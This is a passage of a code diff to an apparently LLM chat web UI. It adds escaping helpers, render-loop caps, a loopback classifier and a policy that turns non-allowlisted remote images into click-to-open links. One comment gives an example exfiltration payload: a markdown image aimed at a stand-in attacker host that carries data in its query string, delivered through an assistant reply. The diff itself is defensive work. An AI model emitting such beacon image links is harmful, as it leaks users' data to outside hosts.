@@ -35,6 +35,24 @@ let _offlineHealthProbePromise=null;
 let _offlineFetchProbeFailures=0;
 let _offlineRawFetch=null;
 let _offlineFetchPatched=false;
+// #7542 helper: tag a free-text input (chat title, project name, file
+// rename, etc.) with the full set of attributes the WebUI's other
+// credential-shaped fields use, so Chrome and password-manager
+// extensions (1Password, LastPass, Bitwarden, Dashlane) do not
+// mis-classify it as a login form. Call from every site that creates
+// a ``createElement('input')`` text field for naming or renaming.
+function _markNonCredentialInput(inp){
+  if(!inp) return inp;
+  inp.autocomplete='off';
+  inp.setAttribute('autocorrect','off');
+  inp.setAttribute('autocapitalize','off');
+  inp.setAttribute('spellcheck','false');
+  inp.setAttribute('data-1p-ignore','true');
+  inp.setAttribute('data-lpignore','true');
+  inp.setAttribute('data-bwignore','true');
+  inp.setAttribute('data-form-type','other');
+  return inp;
+}
 function _browserReportsOnline(){return !('onLine' in navigator)||navigator.onLine!==false;}
 function _offlineHealthUrl(){const url=new URL('health',document.baseURI||location.href);url.searchParams.set('offline_probe',String(Date.now()));return url.href;}
 function _setOfflineChecking(checking){
@@ -278,6 +296,16 @@ function _setCompressionSessionLock(sid){
   window._compressionLockSid=sid||null;
 }
 const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+function jsArg(s){
+  // Encode a value for safe interpolation inside an inline on* handler's JS
+  // string literal. JSON.stringify quotes/escapes for the JS context; esc()
+  // then makes the result safe inside the HTML attribute. Without this, a
+  // value containing a quote breaks out of the handler (esc() alone is
+  // HTML-escaping, which the browser decodes BEFORE executing the inline
+  // handler). Promoted to a shared helper from the kanban dependency fix
+  // (#3797). Use as onclick="fn(${jsArg(v)})" — no manual quotes.
+  return esc(JSON.stringify(String(s == null ? '' : s)));
+}
 function _matchBacktickFenceLine(line){
   const m=String(line||'').match(/^[ ]{0,3}(`{3,})([^`]*)$/);
   if(!m) return null;
@@ -491,13 +519,23 @@ async function startCompressionRecovery(btn){
     if(!sid) throw new Error('Compression recovery did not return a session.');
     try{localStorage.setItem('hermes-webui-session',sid);}catch(_){}
     if(typeof loadSession==='function') await loadSession(sid,{preserveActiveInput:false});
-    else if(data.session){S.session=data.session;S.messages=data.session.messages||[];syncTopbar();renderMessages();}
+    else if(data.session){S.session=data.session;if(typeof _adoptRegenerationRevision==='function')_adoptRegenerationRevision(data.session);S.messages=data.session.messages||[];syncTopbar();renderMessages();}
     if(typeof renderSessionList==='function') await renderSessionList();
     if(typeof _setActiveSessionUrl==='function') _setActiveSessionUrl(sid);
     if(typeof showToast==='function') showToast((data&&data.message)||'Started focused continuation.',3000,'success');
     const composer=$('msg');
     if(composer&&typeof composer.focus==='function') composer.focus();
   }catch(e){
+    // #7710: a cross-profile refusal now also arrives as 409
+    // (``session_profile_mismatch``). That is NOT a stale recovery action —
+    // the card is still valid, the request was simply refused because the
+    // session belongs to another profile. Retiring it would hide a live card
+    // and show a false "conversation already moved on" note.
+    if(e&&e.status===409&&typeof _sessionProfileMismatchFromError==='function'
+       &&_sessionProfileMismatchFromError(e)){
+      if(typeof setStatus==='function') setStatus('Session belongs to a different profile');
+      return;
+    }
     // A 409 means this session no longer has an active recovery action (the
     // session already moved on — e.g. a substantive prompt cleared it). The
     // persisted card in the transcript is stale, so retire it and show a neutral
@@ -536,7 +574,24 @@ function _messageVirtualDefaultHeightForRole(role){
     role&&Object.prototype.hasOwnProperty.call(MESSAGE_VIRTUAL_DEFAULT_ROW_HEIGHTS,role)?role:'default'
   ];
 }
-const MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS=2;
+// Cycle-aware measurement burst tracking (#6654/#6717): instead of a flat
+// render cap, the burst remembers every window cycle key it has already seen.
+// An UNSEEN key means the window is still converging forward (A->B->C->settled
+// — content reflow, late fonts/images, dynamic height) and may proceed; a key
+// that REPEATS means the browser is oscillating (A->B->A->B) and the burst
+// terminates. Keys repeat only when geometry flaps, so legitimate convergence
+// is never capped while oscillation is always bounded.
+// Absolute per-burst ceiling (#6717 re-gate): the seen-key rule alone only
+// ends the burst on a REPEATED key, so a browser emitting a monotonically
+// changing geometry (A->B->C->D->... never repeating) would still loop without
+// limit — the #6654 CPU-runaway class under a different trigger — and the
+// seen-key collection would grow without bound (memory). A distinct-key
+// convergence realistically settles in a handful of frames, so this
+// conservative cap (the historical MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS
+// was 2) ends the burst regardless of key novelty AND bounds the seen-key
+// memory to the cap. Reset through _resetMessageVirtualMeasurementBurst().
+const MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS=12;
+let _messageVirtualMeasurementSeenKeys=[];
 let _messageRenderWindowSid=null;
 let _messageRenderWindowSize=MESSAGE_RENDER_WINDOW_DEFAULT;
 let _messageVirtualHeightCache=[];
@@ -547,7 +602,19 @@ let _messageVirtualEstimatedRowHeight=_messageVirtualDefaultHeightForRole('defau
 let _messageVirtualScrollRaf=0;
 let _messageVirtualWindowKey='';
 let _messageVirtualMeasurementCycleKey='';
-let _messageVirtualMeasurementRetryCount=0;
+let _messageVirtualMeasurementBurstActive=false;
+// Provenance of the QUEUED virtualized render: 'internal' while the pending
+// rAF was requested by the internal measurement chain, 'external' for any
+// other trigger (user scroll / scroll-settle / message append / session
+// load). The origin lives on the QUEUED render itself, NOT in a global
+// consumable flag: when an internal and an external request coalesce into one
+// rAF, _scheduleMessageVirtualizedRender lets EXTERNAL win, so a render that
+// fires after any external trigger is never mis-attributed as internal
+// (#6717 re-gate). renderMessages() resets the burst on every UNMARKED
+// (externally initiated) render trigger, so an overlapping external render
+// always starts a fresh cycle even when an internal measurement callback is
+// still pending.
+let _messageVirtualRenderQueuedOrigin=null;
 let _messageVirtualScrollActive=false;
 let _messageVirtualScrollSettleTimer=0;
 let _messageVirtualDeferredMeasurement=null;
@@ -594,7 +661,7 @@ function _clearMessageVirtualHeightCache(){
   _messageVirtualEstimatedRowHeight=_messageVirtualDefaultHeightForRole('default');
   _messageVirtualWindowKey='';
   _messageVirtualMeasurementCycleKey='';
-  _messageVirtualMeasurementRetryCount=0;
+  _resetMessageVirtualMeasurementBurst();
   _messageVirtualScrollActive=false;
   clearTimeout(_messageVirtualScrollSettleTimer);
   _messageVirtualScrollSettleTimer=0;
@@ -608,6 +675,9 @@ function _resetMessageRenderWindow(sid){
   _clearRenderCache();
   clearVisibleMessageRowCache();
   _clearMessageVirtualHeightCache();
+}
+function _restoreMessageRenderWindowAfterSettledRender(){
+  _messageRenderWindowSize=MESSAGE_RENDER_WINDOW_DEFAULT;
 }
 function _cancelMessageVirtualizedRender(){
   if(_messageVirtualScrollRaf){
@@ -719,6 +789,13 @@ function _messageVirtualMeasurementCycleKeyFor(windowMetrics){
     windowMetrics.tailStart||0,
   ].join(':');
 }
+function _resetMessageVirtualMeasurementBurst(){
+  _messageVirtualMeasurementSeenKeys=[];
+  _messageVirtualMeasurementBurstActive=false;
+  // Strip any pending internal provenance: an external reset must never let
+  // an internal marker survive onto a render that fires later (#6717 re-gate).
+  _messageVirtualRenderQueuedOrigin=null;
+}
 function _scheduleMessageVirtualMeasurementRefresh(windowMetrics){
   if(_messageVirtualScrollActive){
     _messageVirtualDeferredMeasurement=windowMetrics;
@@ -727,15 +804,55 @@ function _scheduleMessageVirtualMeasurementRefresh(windowMetrics){
   const cycleKey=_messageVirtualMeasurementCycleKeyFor(windowMetrics);
   if(_messageVirtualMeasurementCycleKey!==cycleKey){
     _messageVirtualMeasurementCycleKey=cycleKey;
-    _messageVirtualMeasurementRetryCount=0;
   }
-  if(_messageVirtualMeasurementRetryCount>=MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS) return;
-  _messageVirtualMeasurementRetryCount++;
-  requestAnimationFrame(()=>{ _scheduleMessageVirtualizedRender(true); });
+  // Cycle-aware burst tracking (#6717 re-gate): the burst follows ONLY the
+  // internally measurement-scheduled chain (requestAnimationFrame ->
+  // _scheduleMessageVirtualizedRender -> renderMessages -> re-measure -> here).
+  // Within one burst we remember every cycle key already seen. An UNSEEN key
+  // (genuine forward convergence A->B->C->settled — content reflow, late
+  // fonts/images, dynamic height) may proceed, so convergence is never capped
+  // at a flat render count; a key that REPEATS (WebKit's A->B->A->B window
+  // oscillation) ends the burst, so the rAF/measure loop can never run forever
+  // (#6654). The burst starts fresh on every EXTERNALLY initiated render
+  // (session load, message append, real content change — see renderMessages)
+  // and on measurement settlement — never on a cycle-key change alone.
+  if(!_messageVirtualMeasurementBurstActive){
+    _messageVirtualMeasurementSeenKeys=[];
+    _messageVirtualMeasurementBurstActive=true;
+  }
+  // Absolute per-burst cap (#6717 re-gate): even an ALL-DISTINCT monotonic
+  // key sequence (A->B->C->D->... never repeating) must terminate — a repeated
+  // key is not the only way the burst can end. This also bounds the seen-key
+  // collection to the cap (memory). Distinct-key convergence settles in a
+  // handful of frames, so the cap is far above any legitimate multi-pass
+  // reflow while still closing the #6654 CPU-runaway class.
+  if(_messageVirtualMeasurementSeenKeys.length>=MESSAGE_VIRTUAL_MEASUREMENT_MAX_RERENDERS){
+    _resetMessageVirtualMeasurementBurst();
+    return;
+  }
+  const lastKey = _messageVirtualMeasurementSeenKeys.length ? _messageVirtualMeasurementSeenKeys[_messageVirtualMeasurementSeenKeys.length - 1] : null;
+  if(cycleKey !== lastKey && _messageVirtualMeasurementSeenKeys.includes(cycleKey)){
+    // Non-consecutive repeated key (A->B->A): the window is oscillating, not
+    // converging. End the burst (no further internal re-render is scheduled),
+    // so the next externally initiated cycle starts fresh instead of being
+    // starved of retries. A consecutive same-key pass (A->A) proceeds because
+    // heights changed while the window bounds did not (e.g. row shrink across
+    // two passes), still bounded by the absolute per-burst cap (#6717 re-gate).
+    _resetMessageVirtualMeasurementBurst();
+    return;
+  }
+  _messageVirtualMeasurementSeenKeys.push(cycleKey);
+  // The internal-measurement origin travels WITH the scheduled render request
+  // (threaded through BOTH rAF layers into renderMessages), so coalescing can
+  // never consume a stale global marker onto an unrelated render. When an
+  // external request coalesces into the queued rAF, EXTERNAL wins and the
+  // render that fires degrades to an unmarked (burst-resetting) render
+  // (#6717 re-gate).
+  requestAnimationFrame(()=>{ _scheduleMessageVirtualizedRender(true,{origin:'internal'}); });
 }
 function _markMessageVirtualMeasurementsSettled(windowMetrics){
   _messageVirtualMeasurementCycleKey=_messageVirtualMeasurementCycleKeyFor(windowMetrics);
-  _messageVirtualMeasurementRetryCount=0;
+  _resetMessageVirtualMeasurementBurst();
 }
 function _messageVirtualHeightEntryMatches(previousEntry, nextEntry){
   return !!(
@@ -1451,7 +1568,7 @@ function _rememberRenderedUserRowIntrinsicHeights(){
     }
   }
 }
-function _scheduleMessageVirtualizedRender(force){
+function _scheduleMessageVirtualizedRender(force, request){
   const container=$('messages');
   const inner=$('msgInner');
   if(!container||!inner) return;
@@ -1463,9 +1580,28 @@ function _scheduleMessageVirtualizedRender(force){
     _messageVirtualWindowKey=nextKey;
     return;
   }
-  if(_messageVirtualScrollRaf) return;
+  // The request carries its own origin: the internal measurement chain passes
+  // {origin:'internal'} (see _scheduleMessageVirtualMeasurementRefresh);
+  // every other caller is external by default.
+  const requestOrigin=(request&&request.origin==='internal')?'internal':'external';
+  if(_messageVirtualScrollRaf){
+    // Coalescing into an already-queued rAF: the queued render is shared, so
+    // merge the provenance. EXTERNAL always wins — the render that actually
+    // fires must reset the burst, and an internal marker must never survive
+    // onto an external render (#6717 re-gate). An internal request joining a
+    // queued render never downgrades an already-external one.
+    if(requestOrigin==='external') _messageVirtualRenderQueuedOrigin='external';
+    return;
+  }
+  _messageVirtualRenderQueuedOrigin=requestOrigin;
   _messageVirtualScrollRaf=requestAnimationFrame(()=>{
     _messageVirtualScrollRaf=0;
+    // The provenance belongs to THIS queued render: it was set when the render
+    // was scheduled (and possibly flipped to 'external' by a coalesced
+    // external request). Consume it here — no global consumable flag that an
+    // unrelated render could steal (#6717 re-gate).
+    const internalMeasurement=_messageVirtualRenderQueuedOrigin==='internal';
+    _messageVirtualRenderQueuedOrigin=null;
     const liveVisWithIdx=_getVisibleMessagesWithIdx();
     const liveWindow=_currentMessageVirtualWindow(liveVisWithIdx,_messageVirtualKeepTailCount());
     const liveKey=_messageVirtualWindowKeyFor(liveWindow);
@@ -1473,14 +1609,14 @@ function _scheduleMessageVirtualizedRender(force){
     if(_scrollbarDragActive){
       _programmaticScroll=true;
       _programmaticScrollSetAt=performance.now();
-      _compensateScrollForMeasurementDelta(()=>{ renderMessages({ preserveScroll:true }); });
+      _compensateScrollForMeasurementDelta(()=>{ renderMessages({ preserveScroll:true, _internalMeasurement: internalMeasurement }); });
       _deferClearProgrammaticScroll();
       _messageVirtualWindowKey=liveKey;
       return;
     }
     _msgNodeRecycleEnabled=true;
     try{
-      _compensateScrollForMeasurementDelta(()=>{ renderMessages({ preserveScroll:true }); });
+      _compensateScrollForMeasurementDelta(()=>{ renderMessages({ preserveScroll:true, _internalMeasurement: internalMeasurement }); });
     }
     finally{ _msgNodeRecycleEnabled=false; }
   });
@@ -1625,6 +1761,14 @@ async function jumpToSessionStart(){
     // insertion is blocked by !S.busy, losing Activity until "done" fires.
     if(!(S.busy||S.activeStreamId)){
       renderMessages({ preserveScroll:true });
+    }else if(typeof _scheduleMessageVirtualizedRender==='function'){
+      // ...but on a virtualized transcript SOMETHING still has to mount the new
+      // render window. The scroll listener used to do it; it now correctly skips
+      // while a programmatic scroll is in flight (the idle re-render-loop fix),
+      // and this path deliberately does not call renderMessages() — so without an
+      // explicit schedule the jump lands on an all-spacer, zero-row transcript.
+      // Force the window update here, after invalidating _messageVirtualWindowKey.
+      _scheduleMessageVirtualizedRender(true);
     }
     requestAnimationFrame(()=>{
       container.scrollTop=0;
@@ -1727,9 +1871,50 @@ let _dashboardLastNonNeverMode='auto'; // Server-scoped dashboard config keeps t
 let _dashboardSettingsLoadSeq=0;
 let _dashboardSettingsWriteSeq=0;
 
+function _dashboardHostIsLoopback(host){
+  // Canonical loopback classifier shared by the browser origin and the
+  // resolved dashboard target. Normalizes brackets, case, zone ids, and a
+  // terminal hostname dot; classifies IPv4 127/8, IPv6 ::1, IPv4-mapped IPv6
+  // whose embedded IPv4 is 127/8, and localhost/.localhost names (RFC 6761).
+  if(!host) return false;
+  let h=String(host).replace(/^\[|\]$/g,'').toLowerCase();
+  if(h.endsWith('.')) h=h.slice(0,-1);
+  if(h==='localhost'||h.endsWith('.localhost')) return true;
+  const ipv4=/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(h);
+  if(ipv4){
+    const octets=ipv4.slice(1).map(Number);
+    return octets.every(o=>o>=0&&o<=255)&&octets[0]===127;
+  }
+  if(h.includes(':')){
+    const zone=h.indexOf('%');
+    if(zone!==-1) h=h.slice(0,zone);
+    if(h==='::1'||h==='0:0:0:0:0:0:0:1') return true;
+    const mapped=/^(?:::ffff:|0:0:0:0:0:ffff:)(.+)$/.exec(h);
+    if(mapped){
+      const tail=mapped[1];
+      const dotted=/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(tail);
+      if(dotted){
+        const octets=dotted.slice(1).map(Number);
+        return octets.every(o=>o>=0&&o<=255)&&octets[0]===127;
+      }
+      const hex=/^([0-9a-f]{1,4}):([0-9a-f]{1,4})$/.exec(tail);
+      if(hex) return (parseInt(hex[1],16)>>>8)===127;
+      return false;
+    }
+    return false;
+  }
+  return false;
+}
+
 function _dashboardIsBrowserLoopback(){
-  const host=(window.location.hostname||'').replace(/^\[|\]$/g,'').toLowerCase();
-  return host==='127.0.0.1'||host==='localhost'||host==='::1';
+  return _dashboardHostIsLoopback(window.location.hostname||'');
+}
+
+function _dashboardUrlIsLoopback(url){
+  if(!url) return false;
+  try{
+    return _dashboardHostIsLoopback(new URL(url).hostname);
+  }catch(_){return false;}
 }
 
 function _normalizeDashboardEnabledMode(mode){
@@ -1748,7 +1933,13 @@ function _getDashboardChipRestoreMode(){
 function _dashboardBrowserUrl(status){
   if(!status||!status.running) return '';
   if(status.browser_url||status.url){
-    try{return new URL(status.browser_url||status.url).toString().replace(/\/$/,'');}
+    try{
+      const parsed=new URL(status.browser_url||status.url);
+      if(parsed.pathname==='/' || parsed.pathname===''){
+        return parsed.toString().replace(/\/$/,'');
+      }
+      return parsed.toString();
+    }
     catch(_){}
   }
   if(!status.port) return '';
@@ -1833,7 +2024,7 @@ else _initNavActionMirrors();
 function _applyDashboardStatus(status){
   const running=!!(status&&status.running);
   const url=running?_dashboardBrowserUrl(status):'';
-  const warning=running&&!_dashboardIsBrowserLoopback()?t('dashboard_loopback_warning'):'';
+  const warning=running&&!_dashboardIsBrowserLoopback()&&_dashboardUrlIsLoopback(url)?t('dashboard_loopback_warning'):'';
   document.querySelectorAll('[data-dashboard-link]').forEach(btn=>{
     btn.classList.toggle('dashboard-link-visible',running);
     btn.classList.toggle('nav-action-visible',running);
@@ -2666,6 +2857,85 @@ function _dataImageHtml(ref, altText){
   return `<img class="msg-media-img" src="${esc(ref)}" alt="${esc(altText||'image')}" loading="lazy">`;
 }
 
+// Remote image policy (#7941). The served CSP img-src is default-deny for
+// remote origins: an assistant reply containing ![x](https://attacker/?d=...)
+// must not make the browser beacon to that host on render. Operators opt
+// specific origins back in with HERMES_WEBUI_CSP_IMG_EXTRA; the server hands
+// the validated list to the page as window.__HERMES_CONFIG__.imgSrcExtra. The
+// renderer mirrors that list so a non-allowlisted remote image becomes an inert
+// "Open image" link (nothing is fetched until the user clicks) instead of a
+// broken <img> the browser refuses to load. The CSP header stays the security
+// boundary: a mismatch here only changes which fallback is shown.
+function _remoteImageSources(){
+  const cfg=(typeof window!=='undefined'&&window.__HERMES_CONFIG__)||{};
+  return Array.isArray(cfg.imgSrcExtra)?cfg.imgSrcExtra.map(String):[];
+}
+
+function _remoteImageSourceMatches(source, url){
+  const s=String(source||'').trim().toLowerCase();
+  if(s==='https:') return url.protocol==='https:';
+  if(s==='http:') return url.protocol==='http:'||url.protocol==='https:';
+  const m=s.match(/^(https?):\/\/(\*\.)?([a-z0-9._~-]+)(?::(\d{1,5}|\*))?$/);
+  if(!m) return false;
+  const scheme=m[1]+':';
+  if(!(url.protocol===scheme||(scheme==='http:'&&url.protocol==='https:'))) return false;
+  const host=url.hostname.toLowerCase();
+  if(m[2]){
+    if(!(host.length>m[3].length+1&&host.endsWith('.'+m[3]))) return false;
+  }else if(host!==m[3]){
+    return false;
+  }
+  if(m[4]==='*') return true;
+  const defaultPort=url.protocol==='https:'?'443':'80';
+  const urlPort=url.port||defaultPort;
+  const sourcePort=m[4]||(scheme==='https:'?'443':'80');
+  if(!m[4]&&scheme==='http:'&&url.protocol==='https:') return urlPort==='443';
+  return urlPort===sourcePort;
+}
+
+// True when an image URL may load inline: relative (same origin by
+// definition), same origin as the page, a non-http(s) scheme (data:/blob: and
+// friends are judged by the existing sanitizers), or matched by an
+// operator-allowlisted img-src source. Scheme-relative `//host/x` and
+// backslash forms the browser normalises (`https:\\host`) are treated as
+// absolute so they cannot slip past as "relative".
+function _remoteImageAllowed(raw){
+  // Normalise the way the URL parser does before classifying: strip leading/
+  // trailing C0-control-or-space and remove every tab/LF/CR, so `\x01https://x`
+  // or `ht\ttps://x` cannot pass as "relative" while the browser loads it.
+  const value=String(raw||'').replace(/^[\u0000-\u0020]+|[\u0000-\u0020]+$/g,'').replace(/[\t\n\r]/g,'');
+  if(!value) return true;
+  const isAbsolute=/^[a-z][a-z0-9+.-]*:/i.test(value)||/^[\\/]{2}/.test(value);
+  if(!isAbsolute) return true;
+  const hasLocation=typeof location!=='undefined'&&location&&location.href;
+  let url;
+  try{url=new URL(value, hasLocation?location.href:'http://invalid.invalid/');}catch(_){return false;}
+  if(url.protocol!=='http:'&&url.protocol!=='https:') return true;
+  if(hasLocation&&url.origin===location.origin) return true;
+  return _remoteImageSources().some(source=>_remoteImageSourceMatches(source,url));
+}
+
+function _remoteImageReason(raw){
+  let host='';
+  try{host=new URL(String(raw||'')).host;}catch(_){host='';}
+  const reason=(typeof t==='function'?t('remote_image_reason'):'')||'Remote image not loaded automatically. Opens {host} in a new tab.';
+  return reason.replace('{host}', host||'the link');
+}
+
+function _remoteImagePlaceholderHtml(raw, altText){
+  let host='';
+  try{host=new URL(String(raw||'')).host;}catch(_){host='';}
+  const label=(typeof t==='function'?t('remote_image_open'):'')||'Open image';
+  // Say WHY the picture is not shown (title only: aria-label would replace the
+  // visible 'Open image' accessible name, WCAG 2.5.3), like the PDF/HTML
+  // preview fallbacks and mail clients do. Alt text is model-controlled, so it
+  // only ever goes in the title after the reason, never in the visible label.
+  const reason=_remoteImageReason(raw);
+  const alt=String(altText||'').trim();
+  const tip=alt&&alt!=='image'?`${reason} (${alt.slice(0,120)})`:reason;
+  return `<a class="msg-media-link" href="${esc(String(raw||''))}" target="_blank" rel="noopener" title="${esc(tip)}">🖼 ${esc(label)}${host?` · ${esc(host)}`:''}</a>`;
+}
+
 // Markdown image syntax ![alt](url) → HTML. https:// keeps the historical direct
 // <img>; file:// and bare data:image/ URIs route through the same helpers the
 // MEDIA: pipeline uses, so ![x](file:///p.png) renders the artifact card instead
@@ -2678,7 +2948,67 @@ function _mdImageHtml(alt, url){
     return esc(`![${alt}](${String(url).slice(0,64)}…)`);
   }
   if(/^file:\/\//i.test(url)) return _inlineMediaHtmlForRef(url,undefined,alt);
+  if(typeof _remoteImageAllowed==='function'&&!_remoteImageAllowed(url)) return _remoteImagePlaceholderHtml(url, alt);
   return `<img src="${url.replace(/"/g,'%22')}" alt="${esc(alt)}" class="msg-media-img" loading="lazy">`;
+}
+
+function _mediaTokenParts(source, matchOffset, rawRef){
+  let ref=String(rawRef||'');
+  let suffix='';
+  const before=String(source||'').slice(0,Number(matchOffset)||0);
+  // Quotes are valid path/URL bytes, so detach one only when the prose has the
+  // same opener immediately before MEDIA:. The entity forms are what the real
+  // streaming parser passes after escaping text nodes.
+  for(const family of [
+    {value:'"', forms:['"','&quot;']},
+    {value:"'", forms:["'",'&#39;']},
+  ]){
+    if(!family.forms.some(form=>before.endsWith(form))) continue;
+    let quote='', closeAt=-1;
+    for(const form of family.forms){
+      const index=ref.lastIndexOf(form);
+      if(index>closeAt){ quote=form; closeAt=index; }
+    }
+    if(closeAt<=0) continue;
+    const afterQuote=ref.slice(closeAt+quote.length);
+    if(!/^[.,;:!?]*$/.test(afterQuote)) continue;
+    ref=ref.slice(0,closeAt);
+    suffix=family.value+afterQuote;
+    break;
+  }
+  let punctuationStart=ref.length;
+  while(punctuationStart>0&&'.,;:!?'.includes(ref.charAt(punctuationStart-1))){
+    punctuationStart-=1;
+  }
+  const trailingPunctuation=ref.slice(punctuationStart);
+  for(const delimiter of ['***','___','**','__','*','_','`']){
+    if(!before.endsWith(delimiter)) continue;
+    const openerStart=before.length-delimiter.length;
+    if(openerStart>0&&before.charAt(openerStart-1)===delimiter.charAt(0)) continue;
+    let candidate=ref;
+    let afterDelimiter='';
+    if(trailingPunctuation&&candidate.slice(0,-trailingPunctuation.length).endsWith(delimiter)){
+      candidate=candidate.slice(0,-trailingPunctuation.length);
+      afterDelimiter=trailingPunctuation;
+    }
+    if(candidate===delimiter) return null;
+    if(candidate.endsWith(delimiter)&&candidate.length>delimiter.length){
+      const closerStart=candidate.length-delimiter.length;
+      if(candidate.charAt(closerStart-1)===delimiter.charAt(0)) continue;
+      ref=candidate.slice(0,-delimiter.length);
+      // The matching closer proves only its own bytes are outside the
+      // reference. Punctuation immediately before it may be a legal
+      // filename or URL byte and must remain bound to the ref.
+      suffix=delimiter+afterDelimiter;
+      break;
+    }
+  }
+  // A bare trailing punctuation byte is ambiguous: it may be prose, but it
+  // may also be part of a real local filename or remote URL. Only the quote
+  // and delimiter branches above have evidence from a matching opener that a
+  // closer is outside the MEDIA ref, so preserve every other byte verbatim.
+  if(!ref) return null;
+  return [ref,suffix];
 }
 
 function _inlineMediaHtmlForRef(ref, sessionId, altText){
@@ -2711,13 +3041,16 @@ function _inlineMediaHtmlForRef(ref, sessionId, altText){
       src=src.replace(/^https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?/i,base);
     }
     const urlPath=src.split('?')[0];
+    const mediaKind=_mediaKindForName(urlPath);
+    if(mediaKind==='audio'||mediaKind==='video') return _mediaPlayerHtml(mediaKind,src,urlPath.split('/').pop()||mediaKind);
+    // Remote image outside the CSP img-src allowlist (#7941): render an inert
+    // click-to-open link so the browser makes no request on render.
+    if(typeof _remoteImageAllowed==='function'&&!_remoteImageAllowed(src)) return _remoteImagePlaceholderHtml(src);
     // SVG URLs → render inline as image (must precede the https:// <img>
     // catch-all below so extensionless CDN SVG paths still match)
     if(_SVG_EXTS.test(urlPath)){
       return `<img class="msg-media-svg" src="${esc(src)}" alt="${esc(typeof t==='function'?t('media_svg_label'):'svg')}" loading="lazy">`;
     }
-    const mediaKind=_mediaKindForName(urlPath);
-    if(mediaKind==='audio'||mediaKind==='video') return _mediaPlayerHtml(mediaKind,src,urlPath.split('/').pop()||mediaKind);
     // Render all https:// URLs as <img> — extensionless CDN paths like fal.media still work (#853)
     if(_IMAGE_EXTS.test(urlPath) || /^https?:\/\//i.test(src)){
       return `<img class="msg-media-img" src="${esc(src)}" alt="image" loading="lazy">`;
@@ -2939,12 +3272,54 @@ function _getOptionProviderId(opt){
     return group.dataset.provider;
   }
   const value=String(opt.value||'');
-  if(value.startsWith('@') && value.includes(':')) return value.slice(1,value.lastIndexOf(':'));
+  if(value.startsWith('@') && value.includes(':')){
+    // Non-greedy parse for @custom:<slug>:<model> — provider is the slug only.
+    // Preserves endpoint-style host:port custom slugs (e.g. custom:localhost:11434)
+    // while keeping colon-bearing model ids (e.g. @custom:backup:model-a:free -> custom:backup).
+    if(value.startsWith('@custom:')){
+      const afterCustom=value.substring('@custom:'.length);
+      const parts=afterCustom.split(':');
+      if(parts.length>=3 && /^\d+$/.test(parts[1])){
+        const port=parseInt(parts[1], 10);
+        const host=parts[0];
+        const hl=host.toLowerCase();
+        if(port>=1 && port<=65535 && (hl==='localhost' || host.includes('.'))){
+          return 'custom:'+host+':'+parts[1];
+        }
+      }
+      const firstColon=afterCustom.indexOf(':');
+      if(firstColon>=0) return 'custom:'+afterCustom.substring(0,firstColon);
+      return 'custom:'+afterCustom;
+    }
+    // Other @provider:model — provider is up to first colon
+    return value.slice(1,value.indexOf(':'));
+  }
   return '';
 }
 function _providerFromModelValue(modelId){
   const value=String(modelId||'').trim();
-  if(value.startsWith('@')&&value.includes(':')) return value.slice(1,value.lastIndexOf(':'));
+  if(value.startsWith('@')&&value.includes(':')){
+    // Non-greedy parse for @custom:<slug>:<model> — provider is the slug only.
+    // Preserves endpoint-style host:port custom slugs (e.g. custom:localhost:11434)
+    // while keeping colon-bearing model ids (e.g. @custom:backup:model-a:free -> custom:backup).
+    if(value.startsWith('@custom:')){
+      const afterCustom=value.substring('@custom:'.length);
+      const parts=afterCustom.split(':');
+      if(parts.length>=3 && /^\d+$/.test(parts[1])){
+        const port=parseInt(parts[1], 10);
+        const host=parts[0];
+        const hl=host.toLowerCase();
+        if(port>=1 && port<=65535 && (hl==='localhost' || host.includes('.'))){
+          return 'custom:'+host+':'+parts[1];
+        }
+      }
+      const firstColon=afterCustom.indexOf(':');
+      if(firstColon>=0) return 'custom:'+afterCustom.substring(0,firstColon);
+      return 'custom:'+afterCustom;
+    }
+    // Other @provider:model — provider is up to first colon
+    return value.slice(1,value.indexOf(':'));
+  }
   return '';
 }
 function _modelPickerOptionIdentity(modelId, providerId){
@@ -2955,9 +3330,19 @@ function _modelPickerOptionIdentity(modelId, providerId){
     if(exactPrefix && value.toLowerCase().startsWith(exactPrefix.toLowerCase())){
       value=value.substring(exactPrefix.length);
     }else if(value.startsWith('@custom:')){
-      const namedProvider=value.substring('@custom:'.length);
-      const splitAt=namedProvider.indexOf(':');
-      value=splitAt>=0 ? namedProvider.substring(splitAt+1) : namedProvider;
+      const afterCustom=value.substring('@custom:'.length);
+      const parts=afterCustom.split(':');
+      let splitAt=-1;
+      if(parts.length>=3 && /^\d+$/.test(parts[1])){
+        const port=parseInt(parts[1], 10);
+        const host=parts[0];
+        const hl=host.toLowerCase();
+        if(port>=1 && port<=65535 && (hl==='localhost' || host.includes('.'))){
+          splitAt=parts[0].length + 1 + parts[1].length;
+        }
+      }
+      if(splitAt<0) splitAt=afterCustom.indexOf(':');
+      value=splitAt>=0 ? afterCustom.substring(splitAt+1) : afterCustom;
     }else{
       value=value.substring(value.indexOf(':')+1);
     }
@@ -3016,7 +3401,70 @@ function _modelStateForSelect(sel, modelId){
     // id (e.g. model-a:free) synthesized as @custom:backup:model-a:free would
     // otherwise mis-parse to provider "custom:backup:model-a" (#6221 re-gate).
     const routedProvider=selected?String(_getOptionProviderId(selected)||'').trim():'';
-    return {model:routedModel||value,model_provider:routedProvider||explicitProvider};
+    // Normally-rendered catalog options only carry the qualified
+    // @<provider>:<model> value — data-model is set solely by the fallback
+    // injection path (_ensureModelOptionInDropdown). When it is missing, strip
+    // the leading @<provider>: prefix instead of storing the raw dropdown
+    // value as the model id (#6884, #7860).
+    //
+    // The prefix must come from the option metadata's authoritative provider
+    // (routedProvider), NOT from explicitProvider: the latter re-parses the
+    // value at its LAST colon, so a colon-bearing model id like
+    // @custom:backup:model-a:free would otherwise strip to just "free"
+    // (re-gate on the #6221 family).
+    //
+    // The strip is NOT limited to custom providers: any provider that renders
+    // its options as @<provider>:<model> would otherwise persist the provider
+    // twice (once in model, once in model_provider) and the upstream answers
+    // 404 Model-not-found (#7860). A qualified id whose prefix belongs to a
+    // DIFFERENT provider than the option's own metadata is left intact — that
